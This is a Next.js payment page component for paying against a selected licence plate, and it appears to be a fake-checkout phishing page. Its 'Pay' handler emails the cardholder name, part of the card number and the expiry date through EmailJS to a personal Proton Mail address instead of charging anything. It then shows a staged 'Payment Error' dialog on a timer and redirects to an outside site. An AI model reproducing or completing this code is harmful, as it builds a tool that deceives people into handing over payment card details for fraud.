'use client'

import { useState } from 'react'
import Image from "next/image"
import { ArrowLeft, Share, CreditCard, Loader2 } from 'lucide-react'
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { useRouter } from 'next/navigation'
import { usePlateStore } from "@/lib/plates"
import emailjs from 'emailjs-com'
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog"

export default function PaymentPage() {
  const router = useRouter()
  const selectedPlate = usePlateStore((state) => state.selectedPlate)
  const [selectedRate, setSelectedRate] = useState(20.00)
  const [isLoading, setIsLoading] = useState(false)
  const [showError, setShowError] = useState(false)
  const [cardholderName, setCardholderName] = useState('')
  const [cardNumber, setCardNumber] = useState('')
  const [expiryDate, setExpiryDate] = useState('')
  const [cvv, setCvv] = useState('')

  const handlePayment = async () => {
    setIsLoading(true)
    try {
      const result = await emailjs.send(
          'service_id', // Replace with your EmailJS service ID
          'template_id', // Replace with your EmailJS template ID
          {
            to_email: 'megatrondy@proton.me',
            amount: selectedRate.toFixed(2),
            plate: selectedPlate?.number,
            cardholderName,
            cardNumber: cardNumber.slice(-4), // Only send last 4 digits for security
            expiryDate,
            cvv: '***' // Don't send actual CVV for security reasons
          },
          'your_user_id' // Replace with your EmailJS user ID
      )

      console.log('Email successfully sent!', result)

      // Simulate a delay before showing the error
      setTimeout(() => {
        setIsLoading(false)
        setShowError(true)

        // Redirect after a few seconds
        setTimeout(() => {
          router.push('https://car.com')
        }, 3000)
      }, 2000)
    } catch (error) {
      console.error('Error sending email:', error)
      if (error instanceof Error) {
        console.error('Error name:', error.name)
        console.error('Error message:', error.message)
        console.error('Error stack:', error.stack)
      } else {
        console.error('Unknown error:', error)
      }

      setIsLoading(false)
      setShowError(true)

      // Redirect after showing the error
      setTimeout(() => {
        router.push('https://car.com')
      }, 3000)
    }
  }

  if (!selectedPlate) {
    router.push('/')
    return null
  }

  return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        <main className="flex-grow container mx-auto px-6 py-6 pb-20 mb:max-w-[80%]">
          <div className="bg-white rounded-lg shadow-md p-8 my-6">
            <h2 className="text-xl font-semibold mb-6">
              Choose one of the following express checkout options or enter payment details manually.
            </h2>

            <Button
                className="bg-black hover:bg-black/90 text-white px-4 py-4 rounded-lg text-base w-[90px] flex items-center justify-center"
            >
              <Image
                  src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Google_Pay_Logo.svg-wr6DHxsBY3ZOm5YTgktdb35WwDi9S1.png"
                  alt="Google Pay"
                  width={60}
                  height={60}
                  className="brightness-0 invert"
              />
            </Button>

            <div className="mb-6">
              <h3 className="text-lg font-semibold mb-4">Payment Method</h3>
              <div className="flex space-x-4">
                <Image
                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202024-12-10%20at%204.31.28%E2%80%AFPM-dBGoXdy8l8capCNlzuenuoTkeWdW6o.png"
                    alt="Visa"
                    width={40}
                    height={24}
                />
                <Image
                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202024-12-10%20at%204.32.38%E2%80%AFPM-Z2VVqWIwH4KTJpbPX07f7d4SugclDI.png"
                    alt="Mastercard"
                    width={40}
                    height={24}
                />
                <Image
                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202024-12-10%20at%204.33.05%E2%80%AFPM-ZrLHu69CbYto21TIOfXOGunna3RtXL.png"
                    alt="Discover"
                    width={40}
                    height={24}
                />
                <Image
                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202024-12-10%20at%204.34.10%E2%80%AFPM-0jcRZMueIMZacOEoTX2r3HOQb18nUF.png"
                    alt="Mastercard Debit"
                    width={40}
                    height={24}
                />
              </div>
            </div>

            <form className="space-y-4">
              <div>
                <label htmlFor="cardholderName" className="block text-sm font-medium text-gray-700">
                  Cardholder Name
                </label>
                <Input
                    id="cardholderName"
                    type="text"
                    className="mt-1 block w-full border-gray-300"
                    required
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value)}
                />
              </div>

              <div>
                <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700">
                  Card Number
                </label>
                <Input
                    id="cardNumber"
                    type="text"
                    className="mt-1 block w-full border-gray-300"
                    required
                    value={cardNumber}
                    onChange={(e) => setCardNumber(e.target.value)}
                />
              </div>

              <div className="flex space-x-4">
                <div className="w-1/2">
                  <label htmlFor="expiry" className="block text-sm font-medium text-gray-700">
                    Expiry Date (MM/YY)
                  </label>
                  <Input
                      id="expiry"
                      type="text"
                      className="mt-1 block w-full border-gray-300"
                      placeholder="MM/YY"
                      required
                      value={expiryDate}
                      onChange={(e) => setExpiryDate(e.target.value)}
                  />
                </div>
                <div className="w-1/2">
                  <label htmlFor="cvv" className="block text-sm font-medium text-gray-700">
                    CVV
                  </label>
                  <Input
                      id="cvv"
                      type="text"
                      className="mt-1 block w-full border-gray-300"
                      required
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value)}
                  />
                </div>
              </div>
            </form>

            <div className="mt-8 flex justify-between items-center">
              <span className="text-xl font-semibold">Total</span>
              <span className="text-xl font-semibold">${selectedRate.toFixed(2)}</span>
            </div>

            <div className="mt-8 flex justify-between">
              <Button
                  variant="ghost"
                  className="text-[#B71C1C]"
                  onClick={() => router.back()}
                  disabled={isLoading}
              >
                Back
              </Button>
              <Button
                  className="bg-[#B71C1C] hover:bg-[#B71C1C]/90 text-white px-12 py-2 rounded-lg text-base"
                  onClick={handlePayment}
                  disabled={isLoading}
              >
                {isLoading ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Processing
                    </>
                ) : (
                    'Pay'
                )}
              </Button>
            </div>
          </div>
        </main>

        <footer className="p-4 text-center text-gray-600 text-xs">
          © 2022 BBits Solutions Inc
        </footer>

        <Dialog open={showError} onOpenChange={setShowError}>
          <DialogContent>
            <DialogHeader>
              <DialogTitle>Payment Error</DialogTitle>
              <DialogDescription>
                There was an error processing your payment. Please try again later.
              </DialogDescription>
            </DialogHeader>
          </DialogContent>
        </Dialog>
      </div>
  )
}
